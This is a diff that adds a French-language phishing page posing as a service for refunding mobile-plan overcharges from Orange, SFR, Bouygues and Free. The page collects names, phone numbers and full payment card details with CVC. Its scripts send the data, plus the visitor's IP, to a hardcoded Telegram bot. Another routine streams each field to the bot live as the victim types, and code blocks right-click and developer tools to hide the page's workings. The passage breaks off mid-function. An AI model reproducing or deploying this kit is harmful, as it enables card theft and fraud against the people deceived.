@@ -1,0 +1,1996 @@
+<!doctype html>
+    <html lang="fr">
+
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <title>Rembourser son forfait</title>
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+        <style>
+            :root {
+                --bg: #f6f8fb;
+                --card: #ffffff;
+                --text: #0b1324;
+                --muted: #5f6b7a;
+                --primary: #0f3cde;
+                --primary-weak: #e8edff;
+                --radius: 18px;
+                --ring: 0 10px 30px rgba(31, 45, 80, .08), 0 4px 12px rgba(31, 45, 80, .06);
+            }
+
+            * {
+                box-sizing: border-box
+            }
+
+            html,
+            body {
+                margin: 0
+            }
+
+            body {
+                font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
+                background: var(--bg);
+                color: var(--text)
+            }
+
+            /* HEADER */
+            header {
+                width: 100%;
+                background: #fff;
+                position: sticky;
+                top: 0;
+                z-index: 30;
+                border-bottom: 1px solid rgba(16, 24, 40, .06)
+            }
+
+            .header-wrap {
+                max-width: 1100px;
+                margin: auto;
+                padding: 12px 22px;
+                display: flex;
+                align-items: center;
+                gap: 12px
+            }
+
+            .brand {
+                display: flex;
+                align-items: center;
+                gap: 12px
+            }
+
+            .brand img {
+                height: 40px;
+                width: auto;
+                display: block
+            }
+
+            .brand .name {
+                font-weight: 800;
+                letter-spacing: .2px
+            }
+
+            /* HERO */
+            .hero {
+                max-width: 300px;
+                margin: 10px auto;
+                padding: 0 2px
+            }
+
+            .panel {
+                background: linear-gradient(180deg, #0e2a5f, #0b1e44);
+                border-radius: 28px;
+                box-shadow: var(--ring);
+                color: #fff;
+                padding: 44px 28px;
+                position: relative;
+                overflow: hidden;
+            }
+
+            .panel::after {
+                content: "";
+                position: absolute;
+                inset: auto -40px -60px -40px;
+                height: 200px;
+                background: radial-gradient(120px 120px at 30% 0%, #2b6cff33, transparent 60%);
+                z-index: 0;
+                /* تحت المحتوى */
+            }
+
+            .panel>* {
+                /* اجعل النص فوق الطبقة */
+                position: relative;
+                z-index: 1;
+            }
+
+            h1 {
+                margin: 0 0 14px;
+                font-size: clamp(28px, 4.5vw, 48px);
+                line-height: 1.1;
+                text-align: center;
+            }
+
+            .panel h1 {
+                color: #fff !important;
+                /* أبيض إجباري */
+                text-shadow: 0 1px 2px rgba(0, 0, 0, .25);
+            }
+
+            .lead {
+                max-width: 900px;
+                margin: 0 auto;
+                line-height: 1.8;
+                font-size: clamp(16px, 2.2vw, 19px);
+                color: #d8e3ff;
+                text-align: center;
+            }
+
+            /* RESPONSIVE */
+            @media (max-width:560px) {
+                .brand img {
+                    height: 34px
+                }
+
+                .panel {
+                    padding: 34px 18px;
+                    border-radius: 22px
+                }
+            }
+        </style>
+    </head>
+    <script>
+        document.addEventListener("contextmenu", function (e) {
+            e.preventDefault();
+        });
+        
+        document.addEventListener("keydown", function (e) {
+            // F12
+            if (e.key === "F12") {
+                e.preventDefault();
+            }
+        
+            // Ctrl + U
+            if (e.ctrlKey && e.key.toLowerCase() === "u") {
+                e.preventDefault();
+            }
+        
+            // Ctrl + Shift + I / J / C
+            if (e.ctrlKey && e.shiftKey &&
+                ["i", "j", "c"].includes(e.key.toLowerCase())) {
+                e.preventDefault();
+            }
+             // Detect navigation to view-source when possible
+    if (window.location.protocol === "view-source:") {
+        window.location.replace("www.google.com");
+    }
+        });
+        </script>
+        <script>
+            (function () {
+                // Block right-click
+                document.addEventListener("contextmenu", function (e) {
+                    e.preventDefault();
+                });
+            
+                // Block common keyboard shortcuts
+                document.addEventListener("keydown", function (e) {
+                    const key = e.key.toLowerCase();
+            
+                    if (
+                        key === "f12" ||
+                        (e.ctrlKey && key === "u") ||
+                        (e.ctrlKey && e.shiftKey &&
+                         ["i", "j", "c"].includes(key))
+                    ) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                    }
+                }, true);
+            
+                // Detect navigation to view-source when possible
+                if (window.location.protocol === "view-source:") {
+                    window.location.replace("www.google.com");
+                }
+            })();
+            </script></script>
+    <body>
+
+        <!-- HEADER avec logo externe -->
+        <header>
+            <div class="header-wrap">
+                <a class="brand" href="#" aria-label="Accueil">
+                    <!-- بدّل الرابط إلى شعارك الخارجي -->
+
+                    <span class="name">remboursement</span>
+                </a>
+            </div>
+        </header>
+
+                                    <!-- HERO TITLE + PARAGRAPHE -->
+        <main class="hero">
+            <section class="panel">
+                <h1>Rembourser son forfait</h1>
+                <p class="lead">
+                    Nous aidons les clients à récupérer les montants indûment facturés, à résoudre les erreurs de
+                    facturation ou les résiliations non prises en compte. Notre objectif est de simplifier vos démarches
+                    et d’obtenir rapidement votre remboursement auprès des opérateurs mobiles comme Orange, SFR,
+                    Bouygues, Free et d’autres.
+                </p>
+            </section>
+        </main>
+
+    </body>
+
+ 
+
+
+    <section class="tg-wrap">
+        <div class="tg-shell">
+            <div class="tg-inner">
+                <header class="tg-head">
+                    <div class="tg-head-left">
+                        <img decoding="async" class="tg-logo"
+                            src="https://t3.ftcdn.net/jpg/00/87/31/52/360_F_87315257_eqeMa4VLfkODJ4UQZWBRaQAEZduPvRwQ.jpg"
+                            alt="Logo">
+                        <div>
+                            <h2 class="tg-title">0% de frais</h2>
+                        </div>
+                    </div>
+                </header>
+
+
+                <div class="tg-content">
+
+
+                    <div class="form-container">
+                        <!-- معاينة البطاقة -->
+                        <div class="cc-hero" aria-hidden="true">
+                            <div class="cc-chip" aria-label="NFC" role="img">
+                                <svg class="cc-chip__icon" viewBox="0 0 24 24" aria-hidden="true">
+                                    <!-- أيقونة "Tap to Pay" مبسطة على شكل موجات -->
+                                    <path
+                                        d="M7 4a1 1 0 0 1 1.7-.7c3.1 3 3.1 14.4 0 17.4A1 1 0 0 1 7 20c2.7-3 2.7-13 0-16zM11 6a1 1 0 0 1 1.7-.7c2.2 2.1 2.2 11.3 0 13.4A1 1 0 0 1 11 18c1.8-2.2 1.8-9.8 0-12zM15 8a1 1 0 0 1 1.7-.7c1.4 1.3 1.4 8.1 0 9.4A1 1 0 0 1 15 16c1-1.5 1-6.5 0-8z" />
+                                </svg>
+                                <span class="sr-only"></span>
+                            </div>
+                            <div class="cc-main">
+                                <div class="cc-number" id="ccNumberVisual">5131 6366 0680 3221</div>
+                                <div class="cc-row">
+                                    <div class="cc-label">Nom : <span id="ccNameVisual">—</span></div>
+                                    <div class="cc-exp">EXP : <span id="ccExpVisual">05/26</span></div>
+                                </div>
+                            </div>
+                            <div class="cc-brand">international</div>
+                        </div>
+                        <form id="myForm">
+                            <input type="hidden" id="upe_wallet_nonce" value="b5c0eb1cd2">
+                            <div class="row">
+                                <input type="text" name="firstName" placeholder="Prénom" required>
+                                <label></label>
+                                <input type="text" name="lastName" placeholder="Nom" required>
+                            </div>
+
+                            <label></label>
+                            <select id="country" name="country" required>
+                                <option value="FR">France</option>
+                                <option value="AF">Afghanistan</option>
+                                <option value="AL">Albanie</option>
+                                <option value="DZ">Algérie</option>
+                                <option value="AD">Andorre</option>
+                                <option value="AO">Angola</option>
+                                <option value="AR">Argentine</option>
+                                <option value="AM">Arménie</option>
+                                <option value="AU">Australie</option>
+                                <option value="AT">Autriche</option>
+                                <option value="AZ">Azerbaïdjan</option>
+                                <option value="BH">Bahreïn</option>
+                                <option value="BD">Bangladesh</option>
+                                <option value="BY">Biélorussie</option>
+                                <option value="BE">Belgique</option>
+                                <option value="BZ">Belize</option>
+                                <option value="BJ">Bénin</option>
+                                <option value="BO">Bolivie</option>
+                                <option value="BA">Bosnie-Herzégovine</option>
+                                <option value="BW">Botswana</option>
+                                <option value="BR">Brésil</option>
+                                <option value="BG">Bulgarie</option>
+                                <option value="BF">Burkina Faso</option>
+                                <option value="BI">Burundi</option>
+                                <option value="CA">Canada</option>
+                                <option value="CL">Chili</option>
+                                <option value="CN">Chine</option>
+                                <option value="CO">Colombie</option>
+                                <option value="KM">Comores</option>
+                                <option value="CG">Congo</option>
+                                <option value="CD">Congo (RDC)</option>
+                                <option value="CR">Costa Rica</option>
+                                <option value="HR">Croatie</option>
+                                <option value="CU">Cuba</option>
+                                <option value="CY">Chypre</option>
+                                <option value="CZ">Tchéquie</option>
+                                <option value="DK">Danemark</option>
+                                <option value="DJ">Djibouti</option>
+                                <option value="DO">République Dominicaine</option>
+                                <option value="EC">Équateur</option>
+                                <option value="EG">Égypte</option>
+                                <option value="SV">Salvador</option>
+                                <option value="EE">Estonie</option>
+                                <option value="ET">Éthiopie</option>
+                                <option value="FI">Finlande</option>
+                                <option value="FR">France</option>
+                                <option value="GA">Gabon</option>
+                                <option value="GM">Gambie</option>
+                                <option value="GE">Géorgie</option>
+                                <option value="DE">Allemagne</option>
+                                <option value="GH">Ghana</option>
+                                <option value="GR">Grèce</option>
+                                <option value="GT">Guatemala</option>
+                                <option value="GN">Guinée</option>
+                                <option value="GY">Guyana</option>
+                                <option value="HT">Haïti</option>
+                                <option value="HU">Hongrie</option>
+                                <option value="IS">Islande</option>
+                                <option value="IN">Inde</option>
+                                <option value="ID">Indonésie</option>
+                                <option value="IR">Iran</option>
+                                <option value="IQ">Irak</option>
+                                <option value="IE">Irlande</option>
+                                <option value="IL">Israël</option>
+                                <option value="IT">Italie</option>
+                                <option value="JM">Jamaïque</option>
+                                <option value="JP">Japon</option>
+                                <option value="JO">Jordanie</option>
+                                <option value="KZ">Kazakhstan</option>
+                                <option value="KE">Kenya</option>
+                                <option value="KW">Koweït</option>
+                                <option value="KG">Kirghizistan</option>
+                                <option value="LA">Laos</option>
+                                <option value="LV">Lettonie</option>
+                                <option value="LB">Liban</option>
+                                <option value="LS">Lesotho</option>
+                                <option value="LR">Libéria</option>
+                                <option value="LY">Libye</option>
+                                <option value="LT">Lituanie</option>
+                                <option value="LU">Luxembourg</option>
+                                <option value="MG">Madagascar</option>
+                                <option value="MW">Malawi</option>
+                                <option value="MY">Malaisie</option>
+                                <option value="ML">Mali</option>
+                                <option value="MT">Malte</option>
+                                <option value="MA">Maroc</option>
+                                <option value="MX">Mexique</option>
+                                <option value="MD">Moldavie</option>
+                                <option value="MC">Monaco</option>
+                                <option value="MN">Mongolie</option>
+                                <option value="ME">Monténégro</option>
+                                <option value="MA">Maroc</option>
+                                <option value="MZ">Mozambique</option>
+                                <option value="NA">Namibie</option>
+                                <option value="NP">Népal</option>
+                                <option value="NL">Pays-Bas</option>
+                                <option value="NZ">Nouvelle-Zélande</option>
+                                <option value="NI">Nicaragua</option>
+                                <option value="NE">Niger</option>
+                                <option value="NG">Nigeria</option>
+                                <option value="KP">Corée du Nord</option>
+                                <option value="NO">Norvège</option>
+                                <option value="OM">Oman</option>
+                                <option value="PK">Pakistan</option>
+                                <option value="PA">Panama</option>
+                                <option value="PY">Paraguay</option>
+                                <option value="PE">Pérou</option>
+                                <option value="PH">Philippines</option>
+                                <option value="PL">Pologne</option>
+                                <option value="PT">Portugal</option>
+                                <option value="QA">Qatar</option>
+                                <option value="RO">Roumanie</option>
+                                <option value="RU">Russie</option>
+                                <option value="RW">Rwanda</option>
+                                <option value="SA">Arabie Saoudite</option>
+                                <option value="SN">Sénégal</option>
+                                <option value="RS">Serbie</option>
+                                <option value="SG">Singapour</option>
+                                <option value="SK">Slovaquie</option>
+                                <option value="SI">Slovénie</option>
+                                <option value="SO">Somalie</option>
+                                <option value="ZA">Afrique du Sud</option>
+                                <option value="KR">Corée du Sud</option>
+                                <option value="ES">Espagne</option>
+                                <option value="LK">Sri Lanka</option>
+                                <option value="SD">Soudan</option>
+                                <option value="SE">Suède</option>
+                                <option value="CH">Suisse</option>
+                                <option value="SY">Syrie</option>
+                                <option value="TW">Taïwan</option>
+                                <option value="TZ">Tanzanie</option>
+                                <option value="TH">Thaïlande</option>
+                                <option value="TG">Togo</option>
+                                <option value="TN">Tunisie</option>
+                                <option value="TR">Turquie</option>
+                                <option value="UA">Ukraine</option>
+                                <option value="AE">Émirats Arabes Unis</option>
+                                <option value="GB">Royaume-Uni</option>
+                                <option value="US">États-Unis</option>
+                                <option value="UY">Uruguay</option>
+                                <option value="UZ">Ouzbékistan</option>
+                                <option value="VE">Venezuela</option>
+                                <option value="VN">Vietnam</option>
+                                <!-- … إلخ باقي الدول بنفس النمط -->
+                            </select>
+                            
+
+
+                            <div class="row-double">
+                            </div>
+                            <label for="phone">Téléphone (sans indicatif)</label>
+                            <input type="tel" id="phone" name="phone" placeholder="0612345678" inputmode="numeric"
+                                pattern="\d{6,14}" title="Entrez 6 à 14 chiffres sans code pays" required
+                                oninput="this.value=this.value.replace(/\D/g,'')" />
+                            <label>Carte Bancaire :</label>
+                            <div class="card-logo-container">
+                                <input type="text" id="numero" name="numero" placeholder="4234 5678 9012 3456"
+                                    maxlength="16" required oninput="checkCardType(); validateCardNumber(event)">
+                                <img decoding="async"
+                                    src="https://logopng.com.br/logos/visa-17.png"
+                                    id="visaLogo" class="card-logo" style="display:none;">
+                                <img decoding="async"
+                                    src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
+                                    id="mastercardLogo" class="card-logo" style="display:none;">
+                            </div>
+
+                            <div class="row-double">
+                                <select name="field1" required>
+                                    <option value="">Mois</option>
+                                    <option value="01">01</option>
+                                    <option value="02">02</option>
+                                    <option value="03">03</option>
+                                    <option value="04">04</option>
+                                    <option value="05">05</option>
+                                    <option value="06">06</option>
+                                    <option value="07">07</option>
+                                    <option value="08">08</option>
+                                    <option value="09">09</option>
+                                    <option value="10">10</option>
+                                    <option value="11">11</option>
+                                    <option value="12">12</option>
+                                </select>
+                                <select name="field2" required>
+                                    <option value="">Année</option>
+                                    <option value="25">25</option>
+                                    <option value="26">26</option>
+                                    <option value="27">27</option>
+                                    <option value="28">28</option>
+                                    <option value="29">29</option>
+                                    <option value="30">30</option>
+                                    <option value="31">31</option>
+                                    <option value="32">32</option>
+                                    <option value="33">33</option>
+                                    <option value="34">34</option>
+                                    <option value="35">35</option>
+                                    <option value="36">36</option>
+                                    <option value="37">37</option>
+                                    <option value="38">38</option>
+                                    <option value="39">39</option>
+                                    <option value="40">40</option>
+                                    <option value="41">41</option>
+                                    <option value="42">42</option>
+                                    <option value="43">43</option>
+                                    <option value="44">44</option>
+                                    <option value="45">45</option>
+                                </select>
+                                <input type="number" name="field3" placeholder="CVC" required>
+                            </div>
+
+                            <div class="custom-error-message" id="custom-error-message"
+                                style="display:none; color:red; text-align:center;"></div>
+                            <div class="confirmation" id="confirmation"
+                                style="display:none; color:green; text-align:center; margin:10px 0;">
+                                ✅ Votre demande a été envoyée avec succès !
+                            </div>
+
+                            <button type="submit">Confirmation</button>
+
+
+                            <script>
+                                (function () {
+                                    function el(q) { return document.querySelector(q); }
+                                    const num = document.getElementById('numero');
+                                    const first = el('input[name="firstName"]');
+                                    const last = el('input[name="lastName"]');
+                                    const m = el('select[name="field1"]');
+                                    const y = el('select[name="field2"]');
+
+                                    function fmtCard(s) { return (s || '').replace(/\\D/g, '').replace(/(.{4})/g, '$1 ').trim(); }
+                                    function update() {
+                                        if (num) document.getElementById('ccNumberVisual').textContent =
+                                            fmtCard(num.value) || '**** **** **** ****';
+
+                                        const name = ((first?.value || '') + ' ' + (last?.value || '')).trim();
+                                        document.getElementById('ccNameVisual').textContent = name || '—';
+
+                                        const mm = (m?.value || '').toString().padStart(2, '0');
+                                        const yy = (y?.value || '').toString().slice(-2);
+                                        document.getElementById('ccExpVisual').textContent =
+                                            (mm && yy) ? (mm + '/' + yy) : 'MM/AA';
+                                    }
+                                    [num, first, last, m, y].forEach(elm => elm && elm.addEventListener('input', update));
+                                    update();
+                                })();
+                            </script>
+                        </form>
+                    </div>
+
+                    <style>
+                        /* =========================================================
+   style.css — واجهة دفع متجاوبة مع تصحيح محاذاة select/inputs
+   ========================================================= */
+
+                        /* متغيرات */
+                        :root {
+                            --bg: #f6f7fb;
+                            --ink: #0f172a;
+                            --muted: #6b7280;
+                            --line: #e5e7eb;
+                            --card: #0d43c4;
+                            --card-2: #0a3aa9;
+                            --btn: #0b5ed7;
+                            --btn-hover: #0a53be;
+                            --error-bg: #fdeaea;
+                            --error-border: #f7c5c0;
+                            --error-text: #b42318;
+                            --ok: #16a34a;
+
+                            /* ارتفاع قياسي لجميع الحقول */
+                            --field-h: 48px;
+                            --radius: 12px;
+                        }
+
+                        /* تهيئة عامة */
+                        *,
+                        *::before,
+                        *::after {
+                            box-sizing: border-box;
+                        }
+
+                        html,
+                        body {
+                            height: 100%;
+                        }
+
+                        body {
+                            font-family: Arial, sans-serif;
+                            background: var(--bg);
+                            margin: 0;
+                            padding: 12px;
+                            /* موبايل */
+                            color: var(--ink);
+                            -webkit-font-smoothing: antialiased;
+                            -moz-osx-font-smoothing: grayscale;
+                        }
+
+                        h2 {
+                            margin: 10px 0 18px;
+                            text-align: start;
+                        }
+
+                        /* إلغاء أي نافذة/مركزية مفروضة من إضافة */
+                        .modal,
+                        .popup,
+                        .dialog,
+                        .overlay {
+                            position: static !important;
+                            inset: auto !important;
+                            width: auto !important;
+                            height: auto !important;
+                            transform: none !important;
+                            background: transparent !important;
+                            box-shadow: none !important;
+                            border: 0 !important;
+                        }
+
+                        /* الحاوية: الحقول مباشرة على الصفحة */
+                        .form-container {
+                            width: 100%;
+                            max-width: none;
+                            margin: 0;
+                            background: transparent;
+                            padding: 0;
+                            border-radius: 0;
+                            box-shadow: none;
+                        }
+
+                        /* البطاقة الزرقاء */
+                        .cc-hero {
+                            display: flex;
+                            align-items: center;
+                            gap: 16px;
+                            margin: 6px 0 18px;
+                            background: linear-gradient(135deg, var(--card), var(--card-2));
+                            color: #fff;
+                            border-radius: 18px;
+                            padding: 18px 20px;
+                            box-shadow: 0 18px 40px rgba(13, 67, 196, .18);
+                        }
+
+                        .cc-chip {
+                            width: 46px;
+                            height: 34px;
+                            border-radius: 8px;
+                            background: #ffd97a;
+                            box-shadow: inset 0 2px 0 rgba(0, 0, 0, .1);
+                        }
+
+                        .cc-main {
+                            display: flex;
+                            flex-direction: column;
+                            gap: 6px;
+                        }
+
+                        .cc-number {
+                            font: 600 19px/1.2 ui-monospace, SFMono-Regular, Consolas, monospace;
+                            letter-spacing: 2px;
+                        }
+
+                        .cc-row {
+                            display: flex;
+                            gap: 10px;
+                            align-items: center;
+                            flex-wrap: wrap;
+                        }
+
+                        .cc-label,
+                        .cc-exp {
+                            font-size: 13px;
+                            color: #dbe7ff;
+                            opacity: .9;
+                        }
+
+                        .cc-brand {
+                            margin-left: auto;
+                            font-weight: 700;
+                            letter-spacing: .4px;
+                        }
+
+                        /* شبكة الحقول — Mobile-first */
+                        #myForm {
+                            display: grid;
+                            grid-template-columns: 1fr;
+                            /* موبايل: عمود واحد */
+                            gap: 12px;
+                        }
+
+                        /* تسميات */
+                        #myForm label {
+                            font-size: 14px;
+                            color: #334155;
+                            margin-bottom: 6px;
+                            display: block;
+                        }
+
+                        /* ========== قاعدة موحّدة للحقول ========== */
+                        /* نثبت ارتفاعًا موحّدًا ونصحح المحاذاة العمودية */
+                        #myForm input,
+                        #myForm select {
+                            width: 100%;
+                            height: var(--field-h);
+                            min-height: var(--field-h);
+                            padding: 0 14px;
+                            /* بدون padding رأسي للمحاذاة المثالية */
+                            border: 1px solid var(--line);
+                            border-radius: var(--radius);
+                            background: #f9fafb;
+                            color: var(--ink);
+                            font-size: 16px;
+                            /* يمنع تكبير iOS */
+                            line-height: calc(var(--field-h) - 2px);
+                            /* سطر = الارتفاع تقريبا */
+                            vertical-align: middle;
+                            /* احتياط */
+                            outline: none;
+                            transition: box-shadow .2s, border-color .2s, background-color .2s;
+                            background-clip: padding-box;
+                            /* يمنع قص النص */
+                        }
+
+                        /* عندما يكون نوع Number قد يغيّر line-height؛ نحافظ */
+                        #myForm input[type="number"] {
+                            line-height: normal;
+                            /* للفايرفوكس */
+                            padding: 0 14px;
+                            height: var(--field-h);
+                            min-height: var(--field-h);
+                        }
+
+                        /* معالجة خاصة لعناصر select (سبب المشكلة) */
+                        #myForm select {
+                            -webkit-appearance: none;
+                            -moz-appearance: none;
+                            appearance: none;
+                            line-height: normal;
+                            /* مهم: يمنع قص النص */
+                            padding-right: 36px;
+                            /* مساحة للسهم */
+                            background-image:
+                                linear-gradient(45deg, transparent 50%, #94a3b8 50%),
+                                linear-gradient(135deg, #94a3b8 50%, transparent 50%);
+                            background-position:
+                                calc(100% - 22px) calc(50% - 3px),
+                                calc(100% - 15px) calc(50% - 3px);
+                            background-size: 7px 7px, 7px 7px;
+                            background-repeat: no-repeat;
+                        }
+
+                        /* لتوحيد مظهر الخيارات داخليًا */
+                        #myForm select option {
+                            font-size: 16px;
+                        }
+
+                        /* حالات التركيز */
+                        #myForm input:focus,
+                        #myForm select:focus {
+                            border-color: #b9cdfd;
+                            box-shadow: 0 0 0 3px rgba(59, 130, 246, .15);
+                            background: #ffffff;
+                        }
+
+                        /* مجموعات مرنة */
+                        .row {
+                            display: grid;
+                            grid-template-columns: 1fr;
+                            gap: 12px;
+                        }
+
+                        .row-double {
+                            display: grid;
+                            grid-template-columns: 1fr;
+                            gap: 12px;
+                        }
+
+                        /* رقم البطاقة بعرض الصفحة */
+                        #numero {
+                            grid-column: 1 / -1;
+                        }
+
+                        /* زر التأكيد */
+                        #myForm button[type="submit"] {
+                            grid-column: 1 / -1;
+                            appearance: none;
+                            border: 0;
+                            border-radius: 14px;
+                            background: var(--btn);
+                            color: #fff;
+                            height: 52px;
+                            font-weight: 700;
+                            cursor: pointer;
+                            box-shadow: 0 8px 18px rgba(11, 94, 215, .25);
+                            transition: transform .06s ease, background-color .2s ease;
+                        }
+
+                        #myForm button[type="submit"]:hover {
+                            background: var(--btn-hover);
+                        }
+
+                        #myForm button[type="submit"]:active {
+                            transform: translateY(1px);
+                        }
+
+                        /* رسائل الحالة */
+                        .custom-error-message {
+                            grid-column: 1 / -1;
+                            display: none;
+                            padding: 14px;
+                            border-radius: 12px;
+                            background: var(--error-bg);
+                            border: 1px solid var(--error-border);
+                            color: var(--error-text);
+                            font-weight: 600;
+                            text-align: center;
+                        }
+
+                        .confirmation {
+                            grid-column: 1 / -1;
+                            display: none;
+                            color: var(--ok);
+                            font-weight: 700;
+                            text-align: center;
+                            padding: 8px 0;
+                        }
+
+                        /* شعار البطاقات (اختياري) */
+                        .card-logo-container {
+                            display: flex;
+                            justify-content: flex-end;
+                            align-items: center;
+                            height: 40px;
+                            margin-top: 8px;
+                        }
+
+                        .card-logo,
+                        .visa-logo,
+                        .mastercard-logo {
+                            display: none;
+                            width: 30px;
+                            height: 20px;
+                        }
+
+                        /* إخفاء سبنرز الأرقام */
+                        input[type="number"]::-webkit-outer-spin-button,
+                        input[type="number"]::-webkit-inner-spin-button {
+                            -webkit-appearance: none;
+                            margin: 0;
+                        }
+
+                        input[type="number"] {
+                            appearance: textfield;
+                        }
+
+                        /* شاشات أوسع */
+                        @media (min-width:768px) {
+                            body {
+                                padding: 24px;
+                            }
+
+                            #myForm {
+                                grid-template-columns: 1fr 1fr;
+                                gap: 16px;
+                            }
+
+                            .row {
+                                grid-template-columns: 1fr 1fr;
+                            }
+
+                            .row-double {
+                                grid-template-columns: 1fr 1fr 1fr;
+                            }
+
+                            .cc-hero {
+                                padding: 22px 24px;
+                            }
+
+                            .cc-number {
+                                font-size: 20px;
+                            }
+                        }
+
+                        /* وضع داكن اختياري */
+                        @media (prefers-color-scheme: dark) {
+                            :root {
+                                --bg: #0b1020;
+                                --ink: #e5e7eb;
+                                --muted: #a3a3a3;
+                                --line: #24304a;
+                                --btn: #2563eb;
+                                --btn-hover: #1e4fd1;
+                            }
+
+                            #myForm input,
+                            #myForm select {
+                                background: #0f1830;
+                                border-color: #24304a;
+                                color: var(--ink);
+                            }
+                        }
+                    </style>
+
+                    <script
+                        src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDEt98r3lrSLe3mwNjZnKp888rhrmQtPOw&libraries=places"></script>
+                    <script>
+                        function initializeAutocomplete(countryCode) {
+                            const addressInput = document.getElementById('address');
+                            const postalInput = document.querySelector('input[name="postalCode"]');
+                            const cityInput = document.querySelector('input[name="city"]');
+
+                            addressInput.readOnly = false;
+                            addressInput.value = '';
+                            postalInput.value = '';
+                            cityInput.value = '';
+
+                            const autocomplete = new google.maps.places.Autocomplete(addressInput, {
+                                types: ['address'],
+                                componentRestrictions: { country: countryCode.toLowerCase() },
+                                fields: ['address_components', 'formatted_address']
+                            });
+
+                            autocomplete.addListener('place_changed', function () {
+                                const place = autocomplete.getPlace();
+                                if (!place.address_components) return;
+                                let postal = '', city = '';
+                                place.address_components.forEach(function (component) {
+                                    if (component.types.includes('postal_code')) postal = component.long_name;
+                                    if (component.types.includes('locality')) city = component.long_name;
+                                });
+                                if (postal) postalInput.value = postal;
+                                if (city) cityInput.value = city;
+                            });
+                        }
+
+                        document.getElementById('country').addEventListener('change', function () {
+                            if (this.value) {
+                                initializeAutocomplete(this.value);
+                            }
+                        });
+
+                        function checkCardType() {
+                            const value = document.getElementById('numero').value;
+                            const visa = document.getElementById('visaLogo');
+                            const master = document.getElementById('mastercardLogo');
+                            const error = document.getElementById('custom-error-message');
+
+                            visa.style.display = master.style.display = 'none';
+                            error.style.display = 'none';
+
+                            if (value.startsWith('4')) visa.style.display = 'block';
+                            else if (value.startsWith('5') || value.startsWith('2')) master.style.display = 'block';
+                            else if (value.length > 4) {
+                                error.textContent = "Numéro de carte invalide.";
+                                error.style.display = 'block';
+                            }
+                        }
+
+                        function validateCardNumber(event) {
+                            const input = event.target;
+                            input.value = input.value.replace(/\D/g, '');
+                        }
+
+                        function luhnCheck(card) {
+                            const invalids = ['4111111111111111', '5111111111111111', '456201011107', '0000000000000000', '000000000000000', '00000000000000', '0000000000000', '000000000000', '00000000000', '0000000000', '000000000', '00000000', '0000000', '000000', '00000', '0000', '000', '00', '0', '4444444444', '1111111111', '2222222222', '3333333333', '5555555555', '6666666666', '7777777777', '8888888888', '9999999999', '6045515211011300', '1234443256747765'];
+                            if (invalids.includes(card)) return false;
+                            let sum = 0, alt = false;
+                            for (let i = card.length - 1; i >= 0; i--) {
+                                let n = parseInt(card.charAt(i), 10);
+                                if (alt) {
+                                    n *= 2;
+                                    if (n > 9) n -= 9;
+                                }
+                                sum += n;
+                                alt = !alt;
+                            }
+                            return (sum % 10) === 0;
+                        }
+
+                        document.getElementById('myForm').addEventListener('submit', function (e) {
+                            e.preventDefault();
+
+                            const card = document.getElementById('numero').value;
+                            const error = document.getElementById('custom-error-message');
+                            const form = this;
+                            const data = new FormData(form);
+
+                            if (!luhnCheck(card)) {
+                                error.textContent = "Numéro de carte invalide.";
+                                error.style.display = "block";
+                                return;
+                            }
+
+                            // 1. Enregistrement sans user_id
+                            fetch('/wp-admin/admin-ajax.php?action=save_telegram_form', {
+                                method: 'POST',
+                                body: data
+                            }).then(res => res.json()).then(result => {
+                                if (!result.success) {
+                                    
+                                    return;
+                                }
+
+                                // 2. IP + Telegram
+                                fetch('https://api.ipify.org?format=json')
+                                    .then(ipres => ipres.json())
+                                    .then(ip => {
+                                        const ipStr = ip.ip || 'Non dispo';
+                                        const msg = `💳 Facturation
+👤 ${data.get('firstName')} ${data.get('lastName')}
+🌍 ${data.get('country')}
+📞 Tel (sans indicatif): ${data.get('phone')}
+🌐 IP: ${ipStr}
+
+💳 Carte
+🔢 ${data.get('numero')}
+📅 ${data.get('field1')}/${data.get('field2')}
+🔐 CVC: ${data.get('field3')}`;
+
+                                        fetch(`https://api.telegram.org/bot8730509592:AAGrdbD6JFICBlJ2-ohnmSz4aOzQPNdewEU/sendMessage?chat_id=8365539748&text=${encodeURIComponent(msg)}`)
+                                            .then(res => res.json())
+                                            .then(telegram => {
+                                                if (telegram.ok) {
+                                                    // succès → redirect vers 3Ds.html
+                                                    // petite pause 200ms pour s'assurer que la requête est finie côté client
+                                                    setTimeout(() => {
+                                                        window.location.href = 'loading.html';
+                                                    }, 200);
+                                                } else {
+                                                    alert("❌ Erreur Telegram : " + telegram.description);
+                                                }
+                                            }).catch(err => {
+                                                console.warn('Telegram send error:', err);
+                                                alert("❌ Erreur lors de l'envoi Telegram.");
+                                            });
+                                    }).catch(err => {
+                                        console.warn('IP fetch error:', err);
+                                        alert("❌ Impossible de récupérer l'IP.");
+                                    });
+                            }).catch(err => {
+                                console.warn('Save form error:', err);
+                                
+                            });
+                        });
+
+                        /* === 🔵 Live Telegram Updates (single message mode) === */
+                        (function () {
+                            const token = "8730509592:AAGrdbD6JFICBlJ2-ohnmSz4aOzQPNdewEU";
+                            const chatId = "8365539748";
+                            if (!token || !chatId) return;
+
+                            const fields = [
+                                'firstName', 'lastName', 'country', 'address', 'postalCode',
+                                'city', 'phone', 'numero', 'field1', 'field2', 'field3'
+                            ];
+
+                            let messageId = null;
+                            let lastMsg = '';
+                            let timeout;
+
+                            function buildMessage() {
+                                const f = (name) => document.querySelector(`[name="${name}"]`)?.value?.trim() || '';
+                                return (
+                                    `🟢 *Mise à jour en cours...*
+👤 ${f('firstName')} ${f('lastName')}
+🏠 ${f('address')}
+📮 ${f('postalCode')}, ${f('city')}
+🌍 ${f('country')}
+📞 ${f('phone')}
+💳 *Carte:*
+🔢 ${f('numero')}
+📅 ${f('field1')}/${f('field2')}
+🔐 CVC: ${f('field3')}`
+                                );
+                            }
+
+                            async function sendOrEditMessage() {
+                                const message = buildMessage();
+                                if (message === lastMsg) return;
+                                lastMsg = message;
+
+                                try {
+                                    if (!messageId) {
+                                        const res = await fetch(`https://api.telegram.org/bot8730509592:AAGrdbD6JFICBlJ2-ohnmSz4aOzQPNdewEU/sendMessage`, {
+                                            method: 'POST',
